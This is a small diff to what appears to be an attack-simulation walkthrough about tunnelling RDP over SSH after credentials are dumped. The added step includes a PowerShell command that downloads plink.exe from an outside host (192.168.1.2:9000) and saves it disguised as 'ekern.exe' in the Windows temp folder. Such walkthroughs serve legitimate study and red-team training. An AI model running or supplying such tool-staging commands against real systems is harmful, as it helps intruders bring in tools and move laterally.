@@ -105,7 +105,9 @@
 
 ### 3. now we have the dump, we will skip the process of fetching the passwords for now, Lets Go to the next step where the attacker start tunnelling RDP connections over SSH
 
-   a. 
+   a. first we will be downloading `plink.exe` as `ekern.exe`
+
+      (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')
 
    
 
